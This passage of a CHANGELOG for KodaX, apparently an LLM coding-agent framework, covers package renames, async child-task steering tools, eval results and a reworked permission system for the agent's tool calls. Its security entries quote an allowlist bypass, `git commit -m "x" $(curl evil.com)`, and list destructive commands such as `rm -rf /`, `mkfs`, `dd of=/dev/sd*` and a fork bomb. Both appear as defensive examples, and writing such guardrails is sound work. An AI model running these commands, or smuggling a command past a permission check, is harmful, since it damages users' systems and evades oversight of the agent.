`capability-profile.test.ts` gains an explicit pin test asserting all 12 vision-capable providers report `multimodalSupport === 'image-input'` and `codex-cli` reports `'none'` so future regressions are caught.

### Internal / architecture

- **Directory rename: `packages/ai/` → `packages/llm/` for package-name parity**. Closes the directory-vs-npm-name discrepancy left behind by FEATURE_147 v0.7.37, which renamed the npm package from `@kodax/ai` to `@kodax-ai/llm` but left the on-disk directory at `packages/ai/`. New contributors had to mentally translate "ai is actually llm"; prompt examples and tool-description hints saying "Audit packages/ai" pointed to a path that disagreed with the package name. Scope: `git mv packages/ai packages/llm` + 8 tsconfig path/reference updates (root + agent + coding + mcp + session-lineage) + 2 real relative imports in `tests/feature-116-active-cache-control.eval.ts` + ~30 prompt/comment/eval-fixture string updates (`worker-role-prompt.ts` / `role-prompt.ts` / `tools/registry.ts` / `tools/todo-list.test.ts` / `paste/persist-image.ts` / 5 `tests/*.eval.ts` files / 5 `benchmark/datasets/*` fixture files including `h2-plan-execute-boundary/cases.ts` path-prefix `mustNotTouchFiles` assertions). Frozen historical artifacts NOT touched: `benchmark/results/**` snapshots, `.agent/**` runner cache, `.repointel/**` index cache, `docs/CHANGELOG_ARCHIVE.md` + `docs/features/v0.7.0-39.md` historical design records, and `.claude/settings.local.json` user-private allowlist. Active operational docs (CHANGELOG, README, README_CN, DD.md, KNOWN_ISSUES.md, root CLAUDE.md, docs/CLAUDE.md) all updated. No behavior change; git rename detection preserves blame across the move. Pure naming-consistency refactor.
- **`@kodax/coding` blob summarizer module** (`packages/coding/src/tools/blob-summarizer.ts`, 187 lines). `createBlobSummarizer({provider, model, timeoutMs?})` returns a `SummarizeBlob` callback. Combines caller's `abortSignal` with a 30-second timeout via a fresh `AbortController` + listener fan-out. Throws `BlobSummarizerError` on empty input / empty output / provider error. System prompt + user prompt builder exported as constants (`SUMMARIZER_SYSTEM_PROMPT`, `buildSummarizerUserMessage`) so the Layer 2 eval can pin the EXACT production prompt text. 8 deterministic-shell unit tests cover the contract surface (timeout / abort / empty rejection / error wrapping / threshold constants).
- **`KodaXToolExecutionContext.summarizeBlob?` field** (`packages/coding/src/types.ts`). Optional callback shape `(content: string, options?: {readonly maxChars?: number; readonly abortSignal?: AbortSignal}) => Promise<string>`. Wired in `runner-driven.ts` baseCtx with lazy-once memoization bound to the Worker's own provider/model. The dispatch tool calls it via `ctx.summarizeBlob` without owning provider construction — preserves `@kodax/agent` layer independence (agent stays unaware of LLM client).
- **`GuardedToolResult.spillFailed?` flag** (`packages/coding/src/tools/tool-result-policy.ts`). Set when `persistToolOutput` throws and content was returned inline as the data-loss-guard fallback. Callers that need an LLM-summary follow-up (`dispatch-child-tasks` for `child_task_summary` >100KB) branch on this flag. The `console.warn` is intentionally NOT gated on `KODAX_DEBUG_TOOL_GUARDRAILS` — disk failure is a severe operational event an operator must see immediately.
- **`applyChildSummaryGuardrailWithSummarizer` helper in `dispatch-child-tasks.ts`**. Unifies the 4 dispatch call sites (async success / async crash / sync success / sync failure) through a single helper that chains: `applyToolResultGuardrail` → if `spillFailed` + content > 100KB + `ctx.summarizeBlob` exists, attempt LLM summarize → on success, banner-wrap with LOSSY marker → on summarizer failure, console.warn + fall back to inline full content with emergency banner. Symmetric error handling across all 4 sites; banner strings consistent.
- **3 new tracker entries marked Released**: FEATURE_121 (Envelope Spillover Gap-Fix), FEATURE_134 (Image / Screenshot Paste Input). Both originally `Planned` → now `v0.7.40 Released`. FEATURE_LIST.md `Current released version` bumped from v0.7.39 to v0.7.40.
- **Layer 2 eval datasets** at `benchmark/datasets/feature-121-envelope-spillover/` (3 cases: `preview_sufficient` / `detail_required` / `inline_no_spillover`) and `benchmark/datasets/feature-121-blob-summarizer/` (2 cases: `audit_report` / `grep_findings`). Eval drivers at `tests/feature-121-envelope-spillover.eval.ts` and `tests/feature-121-blob-summarizer.eval.ts` (gated on `KODAX_EVAL_F121_SUMMARIZER=1`). Raw outputs preserved per `EVAL_GUIDELINES.md` §"Raw output preservation" under `os.tmpdir()/kodax-eval-dumps/feature-121-*/`.

### Test coverage delta

- New: 8 blob-summarizer unit tests + 25 blob-summarizer dataset shape tests + 27 envelope-spillover dataset shape tests + 9 tool-output-gc tests + 4 worker-role-prompt new tests (LARGE CHILD OUTPUT block + spill-path hint). Plus FEATURE_134's 52 new tests (45 foundation + 7 integration in `prompt-input-controller`).
- Total green at HEAD: **5745 tests pass** (507 test files, 1 skipped, 23 todo).

## [0.7.39] - 2026-05-12

### Theme

**Async Child Steering** — On top of v0.7.36's three-piece foundation (FEATURE_119 Pattern B async dispatch + FEATURE_115 agentId-scoped message queue + FEATURE_114 Worker+Evaluator V2) and v0.7.38's FEATURE_155 idle-yield wait mechanic, v0.7.39 closes the remaining coordinator surface: a Worker can now (1) append refinement instructions to in-flight children via `send_message(to, content)`, (2) request graceful exit of a specific child via `task_stop(task_id, reason?)`, and (3) annotate dispatch calls with a `model_hint: 'fast' | 'balanced' | 'deep'` tier (routing no-op; FEATURE_102 v0.7.45 consumes it). The path to those three tools forces a package-attribution correction (ADR-021): the previously coding-private `ChildTaskRegistry` / `idle-yield` state machine / fan-out concurrency are lifted to `@kodax/agent` so the framework is standalone-consumable for any downstream agent platform without inheriting KodaX coding-flavor concerns.

### Added

- **FEATURE_120 — Async Child Steering (Phases 0a–5b delivered)**. 18 commits between `cce78f67` and `2571e414` cover the implementation surface; Phase 5b's `tests/feature-120-child-steering.eval.ts` Layer 2 behavioral validation runs as part of this release per `benchmark/EVAL_GUIDELINES.md` and clears its pre-registered SHIP gate (≥3/5 aliases ≥80% on each of `send_message_trigger` and `task_stop_trigger`). Final rejudged result (after LLM-judge majority-vote audit caught a 14% regex false-negative rate on the first-pass `tool_name\s*\(` regex): `send_message_trigger` 4/5, `task_stop_trigger` 5/5 — zhipu/glm51 actually 100% on task_stop, the original 0% was pure FN. Test guide: `docs/test-guides/FEATURE_120_v0.7.39_TEST_GUIDE.md`. Design doc: `docs/features/v0.7.39.md#feature_120-async-child-steering--sendmessage--taskstop--dispatch-model_hint-field` (includes per-phase slice landing log + design deviations + Phase 5b case-design diagnosis).

  **Step 0 — orchestration lift to `@kodax/agent` (ADR-021, no behavior change)**:

  - **Phase 1a** (`e02f6ad3`) — `ChildTaskRegistry<T>` type alias + `registerChildTask(registry, id, promise)` helper lifted to `packages/agent/src/orchestration/task-registry.ts`. The helper bundles the FEATURE_155 Bug A hotfix's `.finally(() => registry.delete(id)).catch(() => {})` cleanup chain into a single call so any consumer gets leak-free registry semantics for free. coding's `KodaXToolExecutionContext.childTaskRegistry` field rebinds to the lifted type (structurally identical to the previous inline `Map<string, Promise<…>>`).
  - **Phase 1b** (`2f576a62` + self-review `3b537996`) — Full `idle-yield.ts` lifted verbatim to `packages/agent/src/orchestration/idle-yield.ts` with generic `TChildResult` parameter: `detectIdleYield` predicate + `waitForWakeEvent<TChildResult>(...)` 3-way race + `composeIdleYieldUserMessage<TChildResult>` synthetic-message builder + `countLastAssistantToolCalls` + `isIdleYieldEnabled`. `IdleYieldSnapshot` keeps the Bug E `hasPendingBackgroundMessages` field and Bug F abort-listener cleanup invariants. coding's `_internal/managed-task/idle-yield.ts` deleted (no transition shim, single-commit rebind per "大重构不引入新旧代码并行" rule).
  - **Phase 1c-1** (`48169dd2`) — `runWithIdleYield<TRunResult, TChildResult>(opts)` API in `@kodax/agent` wraps the previous coding-only outer `while(true)` loop in a generic Runner-style call. 8 required + 3 optional callback fields (`runOnce` / `computeSnapshot` / `registry` / `messageQueue` / `agentId` / `resumeAgent` + `abortSignal` / `onIdleWaiting` / `onIterationCap` / `maxIterations`). `DEFAULT_IDLE_YIELD_MAX_ITERATIONS = 64`. 9 unit tests pin cap behavior, callback ordering, live `currentAgent` swap, and empty-wake handling.
  - **Phase 1c-2** (`03d87c56`) — coding's `runner-driven.ts` outer loop (≈150 LoC) replaced with a single `runWithIdleYield({...})` call. Callbacks plumb `recorder.handoff` / `recorder.verdict` / queue / registry / 5-role observer for `idleWaiting`. Net −42 LoC. Behavior parity verified by existing test suites.
  - **Phase 1c-3** (`bc6af8fe`) — Agent-only fan-out + idle-yield example at `packages/agent/src/orchestration/fan-out-idle-yield.example.test.ts` (~40 LoC). Imports restricted to `@kodax/agent` + `@kodax/llm`; proves the framework is consumable standalone without any inbound `@kodax/coding` dependency. This is the ADR-021 verification artifact.
  - **Phase 1d-1** (`5fe09a1c`) — `runFanOut<TBundle, TResult>(opts)` primitive in `@kodax/agent` (Option D — narrow generic lift). Owns bounded concurrency via private semaphore + pre-execution abort check + `Promise.allSettled`-style rejection capture + structured progress events (`start` / `item-done` / `item-failed` with monotonic `completedCount`). 11 unit tests pin every capability: empty bundle, single bundle (degenerate case matching current `executeChildAgents` production calling pattern), `maxParallel < 1` throws, concurrency ceiling enforced, strict-serial collapse, rejection capture, non-Error coercion, abort mid-execution (in-flight finish, queued cancelled), abort-pre-execution (all cancelled), progress event sequence with deterministic ordering under `maxParallel=1`, `item-failed` instead of `item-done` on rejection.
  - **Phase 1d-2** (`50b484f0`) — coding's `executeChildAgents` rewritten as a thin wrapper around `runFanOut`. Read/write split + AGENTS.md injection (`buildWriteSystemPrompt`) + worktree isolation + role policy (`validateWriteBundles`) + briefing remain coding-side; only the truly agent-flavor-agnostic concurrency + abort + progress eventing move out. Local `createSemaphore` + `runWithSemaphore` (~30 LoC) deleted. Code-reviewer independent pass returned zero CRITICAL/HIGH/MEDIUM findings against the parity check.

  **Step 1-5 — feature surface**:

  - **Phase 2a** (`cd9bf243`) — `routeMessage({to, priority, mode, content, registry, queue})` primitive in `@kodax/agent`. Returns `{ok: true, messageId}` on success or `{ok: false, reason: 'unknown-target', to}` when the target isn't in the registry. The router does NOT wrap content (callers own framing) and does NOT decide priority/mode (callers select based on intent). 6 unit tests.
  - **Phase 2b** (`335bf4eb` + pin test `ced07719`) — `send_message` coding tool. Wraps content in `<coordinator-instruction>\n${content}\n</coordinator-instruction>` and routes at `priority='user' / mode='prompt'` via `routeMessage`. Rejects: missing/empty `to` or `content`, `to === '*'` broadcast (FEATURE_123 v0.7.44 deferral), sync-mode dispatch (no childTaskRegistry on context), unknown task_id. The pin test in `ced07719` adds `expect(CHILD_EXCLUDE_TOOLS_BASE).toContain('send_message')` so a future rename / typo can't silently expose the tool to children. 10 unit tests total.
  - **Phase 3a** (`be3182c5`) — `requestTaskStop({taskId, registry, reason?})` primitive + `TaskAbortRegistry = Map<string, AbortController>` type alias in `@kodax/agent`. Discriminated outcome: `ok: true` / `unknown-target` / `already-aborted`. **`signal.reason` is sticky to the first abort cause** — `already-aborted` is reported separately so callers can distinguish "I caused the abort" from "someone else got there first" (debugging chains depend on first-cause preservation). Reason coercion: `Error` pass-through (preserves stack + custom subclasses); `string` → `new Error(reason)`; `undefined` → default Error mentioning the taskId so children always receive a non-empty `signal.reason`. 7 unit tests.
  - **Phase 3b** (`a14a7749` + fix `20c06d38`) — `task_stop` coding tool + per-child AbortController wiring. `dispatch_child_task` async branch now allocates a fresh `AbortController` per child and registers it in `ctx.childAbortControllers` (provisioned alongside `childTaskRegistry` by `tool-execution-context.ts`). The child's effective abort signal is the OR of (parent ctx signal, per-child signal) — a one-shot listener on the parent signal aborts the child's controller when parent aborts; the listener is detached in the IIFE `.finally` to keep listener counts bounded. Tool semantics match the FEATURE_115 soft-pause "tool atomicity" principle: currently-executing tool completes atomically (no hard kill of a 90s `npm test`); child observes the abort at its next `signal.throwIfAborted()` poll and emits a final summary. Optional `reason` is wrapped in `<coordinator-stop-request>` and enqueued at user-priority + system-reminder mode so the child sees WHY before emitting its summary. **Code-reviewer caught a MEDIUM in `a14a7749`**: original ordering enqueued the stop-request message BEFORE checking the abort registry, leaking an orphan message into a dead child's queue in the small window between the two registries' cleanup `.finally` chains (`childAbortControllers.delete` runs in the inner IIFE; `childTaskRegistry.delete` runs in `registerChildTask`'s outer `.finally`). **Fix `20c06d38`**: abort-first ordering — call `requestTaskStop` against the authoritative abort registry first; only enqueue the stop-request on `ok: true`. The new regression test `does NOT enqueue an orphan stop-request when abortRegistry is missing the taskId but childTaskRegistry still has it` pins the inter-cleanup window behavior. 9 unit tests total (8 contract + 1 regression pin).
  - **Phase 4** (`20469903`) — `dispatch_child_task.model_hint: 'fast' | 'balanced' | 'deep'` schema field added. **Routing is a no-op** — every child still runs on the parent's model regardless of hint. The hint is recorded on the `KodaXChildContextBundle.modelHint` field so FEATURE_102 (v0.7.45 capability profile) can consume it later without re-plumbing dispatch. Tolerant parse: known values forward; unknown strings (e.g. `"ultra-fast"`) and non-string types (e.g. `42`) silently fall back to `undefined` so a misuse doesn't fail the dispatch. 6 new tests (3 tier forwarding via `it.each` + omit / unknown-string / non-string-type cases).
  - **Phase 5a** (`2571e414`) — Worker role prompt gains an `ASYNC CHILD STEERING (FEATURE_120 v0.7.39 — send_message + task_stop)` section between DISPATCH RULES and FAN-OUT PLAN GRANULARITY. Teaches: tool usage signatures, when to `send_message` (user added a follow-up mid-task; you forgot a constraint at dispatch — typical pattern 0-1 calls per child), when NOT to (chatting / asking follow-up questions; the child has no idle wait for replies), when to `task_stop` (off-scope / user cancelled / pathologically slow AND faster path exists), when NOT to (slow but progressing — wait for it), the sync-mode `[Tool Error]` gate (`KODAX_ASYNC_DISPATCH=0` produces no-op `[Tool Error]` for both tools), and `model_hint` usage including the "no-op today / FEATURE_102 v0.7.45 activates" callout so the LLM doesn't expect tier-based routing behavior. The dispatch banner also gains a `MODEL HINT` line documenting the optional field. 6 structural pin tests in `worker-role-prompt.test.ts` (section presence + spam guard text + atomic-tool semantics text + explicit anti-patterns + sync-mode gate text + model_hint tier names + ordering).
  - **Phase 5b** (this release) — Layer 2 behavioral eval implemented under `benchmark/datasets/feature-120-child-steering/cases.ts` + `tests/feature-120-child-steering.eval.ts`. Single-turn probe per `benchmark/EVAL_GUIDELINES.md`: 2 controlled cases × 5 runs × 5 production aliases (`zhipu/glm51` / `kimi` / `mmx/m27` / `ark/glm51` / `ds/v4pro`) = 50 LLM calls (~$1.5). Regex-judges check the output invokes the expected tool name (4 syntax variants — fn-call / JSON / XML / kw) AND references the in-flight task_id; raw output dumped to `os.tmpdir()/kodax-eval-dumps/feature-120-child-steering/` per the Raw Output Preservation rule. **LLM-judge audit** (`tests/feature-120-child-steering-judge-audit.eval.ts` + EVAL_GUIDELINES anti-pattern 7 §3 strict clause) ran a 3-judge panel-internal majority vote (`zhipu/glm51` + `ds/v4pro` + `kimi`, 50 raw outputs × 3 judges = 150 LLM calls) over the dumped raw outputs and confirmed the final rejudged pass-rate matrix below. **Pre-registered SHIP gate** (≥3/5 aliases ≥80% on each case) cleared with margin: `send_message_trigger` **4/5** (kimi/ark/v4pro 100%, mmx 80%, zhipu 20%); `task_stop_trigger` **5/5** (zhipu/kimi/mmx/ark/v4pro all 100%). **Initial-judge defect (first-pass `tool_name\s*\(` regex)**: the original regex required the tool name to be immediately followed by `(`, which produced a 14% false-negative rate vs LLM-judge majority vote — zhipu/glm51 emits `<task_stop>(args)` / `<task_stop>...</task_stop>` / `<tool_call>{"name":"task_stop", ...}</tool_call>` shapes that don't pass `\s*\(`. Fix: judges rewritten as multi-syntax (`buildToolNamePatterns` in `cases.ts`); EVAL_GUIDELINES anti-pattern 7 amended with strict clause §4 (multi-syntax detection mandatory for positive tool-call judges) and §5 (judge-model selection — panel-internal majority vote required, anthropic/openai prohibited). The 5b eval pass-rate above is the rejudged number; raw dump (source of truth) is unchanged. **Case-design diagnosis (separate, earlier pass)**: first send_message_trigger user message ("also check the auth module") was ambiguous between widen-scope (`send_message`) and parallel-sibling-dispatch (`dispatch_child_task`) — 3/5 aliases legitimately chose the parallel-dispatch strategy. Per EVAL_GUIDELINES anti-pattern 5 ("don't blindly tweak the prompt to mask a case-design bug"), reshaped to a within-scope constraint refinement (`skip the vendored libraries under packages/coding/vendor/`) which has no valid sibling-dispatch alternative. **Updated zhipu/glm51 read**: not a floor model on task_stop — produces semantically-correct calls in 100% of runs but emits non-standard syntax. Provider-side parser tolerance is the production correctness gate, not the prompt. **`model_hint` advisory case intentionally dropped** — its "may set ... to advertise" prompt language has no clean positive/negative assertion (anti-pattern 7), AND routing on the hint is a no-op in v0.7.39 (FEATURE_102 v0.7.45 activates), so an eval today would burn budget on a property with no observable production effect.

  **Behavioral parity**: Step 0's seven phases are pure packaging lifts — no semantic change. All FEATURE_155 Bug A→G hotfix invariants ride along to the lifted modules. The 27 agent test files / 363 tests + 230 coding test files / 2238 tests pass green after each Step-0 phase, demonstrating zero regression across the migration. `runFanOut` reviewer-verified parity flagged only behavior-equivalent shifts: result order is now completion-order for all outcomes (was fulfilled-first / rejected-appended-in-bundle-order; consumers iterate by reference, no indexed access); progress events have richer structure than the previous string `onProgress` callback; non-Error rejections coerce identically to the previous branch (`String(err)` ≡ `new Error(String(err)).message`).

### Changed

- ⚠️ **npm package renamed `@kodax-ai/cli` → `@kodax-ai/kodax`** (effective v0.7.39 publish). Two-step rename history: v0.7.37/v0.7.38 first shipped as `@kodax-ai/cli`; v0.7.38 also dual-published a transitional `@kodax-ai/kodax-cli@0.7.38` (commit `8976f964`); v0.7.39 settles on the final canonical name `@kodax-ai/kodax` (no `-cli` suffix). Rationale: industry standard is product-name-in-package (`@anthropic-ai/claude-code`, `aider-chat`, `next`, `vite`) — `-cli` suffix implies a separate non-CLI SDK package that doesn't exist. v0.7.38 is the last window before user count grows; v1.0 would be too late. **Migration**: `npm uninstall -g @kodax-ai/cli && npm install -g @kodax-ai/kodax` (or `@kodax-ai/kodax-cli` → `@kodax-ai/kodax` for v0.7.38 dual-publish users). The `kodax` bin command is unchanged. `@kodax-ai/cli@*` will be deprecated post-publish; `@kodax-ai/kodax-cli@0.7.38` will be unpublished within the 72h window (single version, no downstream binding). Rationale recorded in [ADR-024](docs/ADR.md#adr-024-npm-发布物正名-kodax-ainkodax--sdk-subpath-exports-形式化-v0739); ADR-022 Addendum marked superseded.
- **SDK subpath exports added** (ADR-024). The single `@kodax-ai/kodax` npm package now exposes 5 tree-shake-friendly subpaths in addition to the root entry:
  - `@kodax-ai/kodax/agent`  → `@kodax-ai/agent` (Runner, fan-out, idle-yield)
  - `@kodax-ai/kodax/llm`    → `@kodax-ai/llm` (12-provider abstraction)
  - `@kodax-ai/kodax/coding` → `@kodax-ai/coding` (tools, prompts, `runKodaX`)
  - `@kodax-ai/kodax/repl`   → `@kodax-ai/repl` (Ink TUI, config helpers)
  - `@kodax-ai/kodax/skills` → `@kodax-ai/skills` (zero-dep skill loader)

  Bundle layout: CLI stays self-contained for fast bin startup; the 6 SDK entries (root + 5 subpaths) are built as one esbuild call with `splitting: true`, emitting `dist/chunks/*.js` for shared code so re-exporting the same internal package from multiple subpaths does not multiply tarball size. Verified v0.7.39 tarball: 1.1 MB packed / 3.5 MB unpacked / 63 files. Each subpath entry is 1-30 kB; bulk lives in shared chunks.
- **`packages/skills/.../utils.js` SDK loader simplified to 3-Strategy** (commit `a063a801`). Legacy fallbacks for the historical `@kodax-ai/cli` and transitional `@kodax-ai/kodax-cli` aliases removed — they only existed to keep already-installed users working through the rename window. Strategies remain: (1) relative path `'../../../index.js'` (99%+ — bundled skill consumers); (2) `@kodax-ai/coding` (dev monorepo workspace symlink); (3) `@kodax-ai/kodax` (edge-case fallback for SDK consumers running helper scripts outside the bundle).
- ⚠️ **`auto[llm]` permission decision layering inverted — FEATURE_158 + ADR-025**. Previously the REPL fired `dangerous-bash` (Step 2.5) and `protected-path` (Step 3) as **synchronous hard vetos** before the LLM classifier ever saw the tool call, short-circuiting ≥70% of bash invocations and rendering FEATURE_092's "LLM-comprehensive judgement" promise vacuous. Cutover (commit `0b0f48d3`) inverts the order: in `mode==='auto' && engine==='llm'` the REPL keeps only Tier 1 zero-cost allows (read-only bash + `--help` fast-path + SAFE_YOLO_ALLOWLISTED_TOOLS); everything else is escalated to `AutoModeToolGuardrail.beforeTool`, which (a) runs **Tier 0 absolute denylist** — 5 catastrophic patterns (`rm -rf /|~`, `mkfs.*`, `dd of=/dev/sd*`, fork bomb, `~/.kodax/` write) the LLM cannot override; (b) collects 8 typed signals (`dangerous_pattern` / `protected_path` / `outside_project` / `shell_redirect_outside` / `package_install` / `git_write` / `network` / `file_modification`) from pluggable `SignalCollector[]`; (c) runs `speculative classify` (race the classifier against a 500ms quiet window; `KODAX_AUTO_SPECULATIVE_WINDOW_MS` env override) so fast classifications skip the confirm dialog; (d) feeds signals into the classifier prompt as **context**, not pre-veto. Engine downgrade (denial 3/20 or breaker 5/10m → engine='rules') re-engages the original REPL Step 2.5/3 path as defense-in-depth. Plan / accept-edits modes are not touched. UX: confirm dialog Scope/Risk now renders from `_classifierSignals` when present (auto[llm] escalate path), keeping marker-based rendering for plan/accept-edits.
- **`packages/repl/src/permission/permission.ts:looksLikePath` Windows-flag heuristic — FEATURE_158 structural fix (subsumes [Issue 131](docs/KNOWN_ISSUES.md#131))**. Pre-fix: `token.startsWith('/')` returned true for Windows cmd flags `/R` / `/B` / `/Y` / `/MIR` / `/A:H`, which `path.resolve()` then resolved to `C:\R` etc. — outside-project paths that triggered "Protected path" false-positive confirm in `auto` mode (`findstr /R`, `dir /B`, `where /R`, `xcopy /Y`, `robocopy /MIR`, `fc /B`). Fix: `IS_WINDOWS_CMD_FLAG = /^\/[A-Za-z][A-Za-z0-9]*(?::[A-Za-z0-9]+)?$/` rejects pure-letter (optional `:value`) tokens on win32. `BASH_SAFE_READ_COMMANDS` also extended with `git tag` / `git stash list` / `git describe` / `git config --get` so they hit Tier 1 fast-path and bypass the heuristic entirely. Regression coverage: 7 it.each + 1 headline pipeline case in `packages/repl/src/permission/repl-bash-signals.test.ts`.

### Internal / architecture

- **ADR-021 package-attribution boundary enforced**: `packages/agent/` now exports a substrate set sufficient for any downstream agent platform — `ChildTaskRegistry` + `registerChildTask`, full idle-yield state machine, `runWithIdleYield` Runner-style API, `runFanOut` concurrency primitive, `routeMessage` cross-agent send-message router, `requestTaskStop` abort primitive + `TaskAbortRegistry` — without any inbound `@kodax/coding` dependency. The agent-only fan-out + idle-yield example test at `packages/agent/src/orchestration/fan-out-idle-yield.example.test.ts` is the durable verification artifact; if a future change introduces a coding-side import there, the lift has regressed.
- **`@kodax/coding/guardrails/auto-mode` substrate (FEATURE_158 / ADR-025)** — new modules: `signals.ts` (`SignalCollector` interface + `ToolCallSignal` discriminated union over 8 kinds + `collectAllSignals` aggregator), `bash-signals.ts` + `file-signals.ts` (built-in collectors wrapping pre-existing `classifyBashCommand` / file-tool paths), `absolute-denylist.ts` (Tier 0 frozen list, token-aware `rm -rf` detection requires both `r` and `f` flags), `speculative.ts` (`speculativeRace(promise, windowMs)` with `KODAX_AUTO_SPECULATIVE_WINDOW_MS` env override, default 500ms). `AutoModeToolGuardrail` gains optional `projectRoot` / `signalCollectors` / `extraCollectors` / `speculativeWindowMs` config so REPL can inject `replBashPathSignalCollector` (path-based protected/outside detection) without breaking the `@kodax/coding` ⇏ `@kodax/repl` layer boundary. Signal-based Scope/Risk rendering in `packages/repl/src/common/tool-confirmation.ts` is strictly richer than the legacy marker-based path. Re-exports added in `packages/coding/src/index.ts` for SDK consumers (`SignalCollector`, `ToolCallSignal`, `bashSignalCollector`, `fileSignalCollector`, `checkAbsoluteDeny`, `speculativeRace`).

---

## [0.7.38] - 2026-05-11

### Theme

**Nine-feature delivery — Queued Prompt Injection Latency & Mid-Turn UX Parity, Write-Child Mutation Context Injection, TodoList Visibility & LLM Self-Seeding Parity, Bash AST Migration, LLM-backed Bash Prefix Extractor, Universal `--help` Fast-Path, Chat-While-Waiting, Idle-Wait Visual Continuity, Windows / macOS Case-Insensitive Workspace Match.** v0.7.38's RC snapshot (2026-05-09) shipped the originally-planned three-feature delivery: closing the "queued prompt feels laggy" gap users hit in v0.7.37 by removing four cumulative latency sources and adding three Claude-Code-style mid-turn UX surfaces (FEATURE_149); correcting the long-standing under-injection where parallel write children silently skipped the project's `AGENTS.md` mutation policy because they shared the read-child minimal system prompt (FEATURE_117 v2); and closing the FEATURE_097 coverage gap where users almost never saw the realtime todo list (FEATURE_151). Between the RC and final release, six additional pieces landed and ship in the same `0.7.38` version: security hardening (FEATURE_152/153/154 — closing Issue 129 follow-up + auto-mode allowlist injection vulnerability), V2 Worker default flip (FEATURE_114 Slice 6/7/8), full Chat-While-Waiting delivery with idle-yield wait pattern + 7-bug hotfix chain (FEATURE_155), idle-wait visual continuity (FEATURE_156), Windows / macOS case-insensitive workspace match for `kodax -c` (FEATURE_157), and a UX polish pass that suppresses harness lifecycle markers in the transcript by default for chat-while-waiting flow parity with Claude Code. Configuration cleanup: KodaX no longer reads `CLAUDE.md` as a fallback when `AGENTS.md` is absent — `CLAUDE.md` is Claude-Code-specific project guidance and injecting it into the KodaX agent context produces semantic mismatch (KodaX's own repo dogfood-bit this).

### Added (post-RC — landed 2026-05-09 → 2026-05-11)

**Security hardening** (Issue 129 follow-up):

- **FEATURE_152 — Bash command parsing regex → AST migration**. Replaces the strip-then-classify regex pipeline with `shell-quote@1.8.3` AST parsing in `packages/repl/src/permission/bash-ast.ts`. Output is a structured `BashCommandTree` (statements / pipelines / argv / redirections + `unparseable: true` fail-closed flag). `isBashReadCommand` / `isBashWriteCommand` fully migrated to AST; `extractPathsFromCommand` / `collectBashWriteTargets` are AST + Windows-path regex hybrid (shell-quote POSIX-escape eats backslash paths). 14 attack-surface hardening tests. ADR-023 records the decision; Issue 129 follow-up notes mark the hotfix-era strip-then-classify as superseded by structural fix.
- **FEATURE_153 — LLM-backed bash prefix extractor**. New module `packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.ts` (~400 LoC). Replaces naive `command.startsWith(pattern)` allowlist matching — the previous behaviour allowed `git commit -m "x" $(curl evil.com)` to match `Bash(git commit:*)` and bypass auto-mode review. New path lifts CC's `BASH_POLICY_SPEC` prompt, runs Haiku-grade LLM extraction with LRU cache (200 entries), fails closed to user confirmation on extractor error. `isToolCallAllowed` migrated sync → async with optional `extractor?` parameter. All 4 production call sites switched in one cutover (REPL / InkREPL / ACP server / executor.ts).
- **FEATURE_154 — Universal `--help` fast-path**. Generalises CC's `isHelpCommand` past KodaX's 12-tool hardcoded list. Any `<cmd> --help` (token-validated, no quotes, no shell metacharacters) bypasses the LLM extractor — saves token cost + latency for `docker --help` / `kubectl --help` / `terraform --help` / etc. ~50 LoC pure function added at the top of `isBashReadCommand`.

**Architecture (V2 default flip + new orchestration primitive)**:

- **FEATURE_114 Slice 6/7/8 — V2 Worker chain becomes default**. The V2 Worker-merge harness (Scout/Worker/Evaluator, replacing V1's Scout/Planner/Generator/Evaluator) was opt-in behind `KODAX_HARNESS_V2` in earlier versions. Slice 6 baseline eval; Slice 7 default flip (now ON unless explicit `KODAX_HARNESS_V2=false`); Slice 8 apples-to-apples V1 vs V2 comparison eval. Breaking-only-by-default: callers can opt back into V1 via env flag.
- **FEATURE_155 — Chat-While-Waiting (full Phase A → D delivered in v0.7.38)**. Removes `await_child_task` and adopts CC's idle-yield wait pattern: Worker emits a one-line status with no tool calls, runner-driven outer loop blocks on the next external wake event (child completion / inbound user message / abort), resumes Worker with a synthetic `<task-completed task_id="…">…</task-completed>` user message. Same MessageQueue carries both events; `priority='user'` (typed input) wins over `priority='background'` (child notification) in the same drain cycle — users chat with the agent while children are in flight. Originally scoped to v0.7.39; merged into v0.7.38 to ship together with the hotfix follow-ups below. Phases:
  - **A1** — `idle-yield.ts` foundation utilities (`detectIdleYield` predicate, `waitForWakeEvent` 3-way race, `composeIdleYieldUserMessage` synthetic-message builder, `countLastAssistantToolCalls` snapshot helper). 33 unit tests pin every boundary. Commit `6a420504`.
  - **A2** — Runner-driven outer loop wraps `Runner.run` in `while(true)`; on idle-yield exit, calls `waitForWakeEvent`, splices the wake content into the next user turn, re-enters `Runner.run`. Defensive `IDLE_YIELD_MAX_ITERATIONS=64` floor. 35 tests. Commits `1f0d1eab` / `bbf747d3`.
  - **B1** — Worker prompt + `dispatch_child_task` banner teach idle-yield. Layer 2 single-turn eval (3 cases × 5 aliases × 5 reps). First run PARTIAL (2/4 aliases ≥80%); rerun added `zhipu/glm51` and met SHIP gate (3/5 ≥80%). Default `KODAX_IDLE_YIELD` flipped to ON. Commits `3828265f` / `016e3fb2` / `1a08de10` / `6a63d986`.
  - **B2** — V2 Worker chain drops `awaitChildTask` from its tool list. Commit `3830141b`.
  - **C1** — Full tool removal: `await-child-task.ts` deleted; `registry.ts` / `tool-permission.ts` / `child-executor.ts` `CHILD_EXCLUDE_TOOLS_BASE` / V1 chain validation cleaned up. Commit `80410e49`.
  - **C2** — `YIELD_TOOL_NAMES` Set emptied; `midTurnDrainPriority` retires the yield-tool gate (outer loop owns background-priority dequeue now). Commit `c8990094`.
  - **C3** — `KODAX_IDLE_YIELD` env-flag retired; `isIdleYieldEnabled()` hard-coded to `true`. Commit `35468f9f`.
  - **D1** — design doc + CHANGELOG + FEATURE_LIST + test guide. Commit `292d3e51`.
  - **D2** — Layer 2 chat-while-waiting behavioral eval (perception budget) + final regression sweep + retire `tests/feature-148-post-dispatch-probe.eval.ts` to `tests/_archive/`. Commit `3efae389`.

**FEATURE_155 hotfix follow-up chain (2026-05-11 — found in production, fixed before release)**:

Production trace showed Evaluator emitting `emit_verdict` accept before children returned, then receiving duplicate `<task-completed>` notifications that drove degenerate LLM turns up to `IDLE_YIELD_MAX_ITERATIONS=64`. Four commits resolved 7 distinct bugs uncovered during deep review:

- **Bug A — child registry never cleaned up after settle** (`c1bdaf4`). Slice C1 deleted `await_child_task` which previously called `registry.delete(taskId)` at reclaim time. No compensating cleanup on the idle-yield path. Fix: dispatch IIFE chains `.finally(() => registry.delete(childId)).catch(() => {})`.
